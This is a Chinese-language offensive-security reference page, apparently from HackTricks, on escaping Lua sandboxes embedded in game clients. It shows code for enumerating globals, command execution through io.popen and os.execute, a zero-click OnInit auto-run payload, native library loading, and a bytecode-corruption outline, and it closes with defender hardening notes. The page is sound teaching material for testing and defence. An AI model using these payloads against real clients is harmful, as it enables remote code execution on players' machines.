# 绕过 Lua 沙箱（嵌入式 VM、游戏客户端）

{{#include ../../../banners/hacktricks-training.md}}

本页收集了用于枚举并突破嵌入在应用程序中的 Lua “沙箱”的实用技术（尤其是游戏客户端、插件或应用内脚本引擎）。许多引擎暴露出受限的 Lua 环境，但仍会留下可访问的强大全局，这些全局可导致任意命令执行，甚至在暴露字节码加载器时引发本地内存破坏。

关键思路：
- 将 VM 视为未知环境：枚举 _G，发现哪些危险原语可达。
- 当 stdout/print 被屏蔽时，滥用 VM 内的任意 UI/IPC 通道作为输出接收器以观察结果。
- 如果 io/os 被暴露，通常可以直接执行命令（io.popen、os.execute）。
- 如果暴露了 load/loadstring/loadfile，执行精心构造的 Lua 字节码可以在某些版本中破坏内存安全（≤5.1 的验证器可被绕过；5.2 移除了验证器），从而实现高级利用。

## 枚举沙箱环境

- 转储全局环境以清点可达的表/函数：
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- 如果没有 print() 可用，可改用 in-VM 通道。来自 MMO housing script VM 的示例：chat output 只有在 sound call 之后才会生效；以下构建了一个可靠的输出函数：
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
将此模式泛化到你的目标：任何接受字符串的 textbox, toast, logger, or UI callback 都可以作为 stdout 用于侦察。

## 如果暴露了 io/os，可以直接执行命令

如果沙箱仍然暴露标准库 io or os，你很可能可以立即执行命令：
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- 执行发生在 client process 内；许多阻止 external debuggers 的 anti-cheat/antidebug 层并不会阻止 in-VM process creation。
- 还要检查：package.loadlib (arbitrary DLL/.so loading)、require with native modules、LuaJIT's ffi (if present)、以及 debug library（可以在 VM 内提升权限）。

## 通过 auto-run callbacks 的 Zero-click 触发器

如果 host application 将脚本推送到 clients 且 VM 暴露 auto-run hooks（例如 OnInit/OnLoad/OnEnter），则在脚本加载时立即将你的 payload 放到那里，以实现 drive-by compromise：
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
任何等效的回调（OnLoad、OnEnter 等）在脚本被传输并自动在客户端执行时会将此技术泛化。

## 在侦察期间要搜索的危险原语

在 _G 枚举期间，特别注意查找：
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: 执行源代码或 bytecode；支持加载不受信任的 bytecode。
- package, package.loadlib, require: 动态库加载和模块接口。
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load to call native code directly.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## 可选升级：abusing Lua bytecode loaders

当 load/loadstring/loadfile 可达但 io/os 受限时，执行精心构造的 Lua bytecode 可能导致内存泄露和破坏原语。要点：
- Lua ≤ 5.1 随附了一个 bytecode verifier，该 verifier 有已知的 bypasses。
- Lua 5.2 完全移除了该 verifier（官方立场：应用应直接拒绝 precompiled chunks），如果不禁止 bytecode loading 则扩大了攻击面。
- 典型工作流：通过 in-VM 输出 leak 指针，构造 bytecode 以制造 type confusions（例如围绕 FORLOOP 或其他 opcodes），然后枢转为 arbitrary read/write 或 native code execution。

此路径依赖于引擎/版本并需 RE。详见参考以获取深入分析、利用原语和在游戏中的示例 gadgetry。

## 检测与加固说明（供防御者）

- Server side：拒绝或重写用户脚本；白名单安全 API；移除或绑定为空 io、os、load/loadstring/loadfile/dofile、package.loadlib、debug、ffi。
- Client side：以最小 _ENV 运行 Lua，禁止 bytecode loading，重新引入严格的 bytecode verifier 或签名校验，并阻止客户端进程创建子进程。
- Telemetry：在脚本加载后不久对 gameclient → child process creation 发出告警；与 UI/chat/script 事件做关联分析。

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
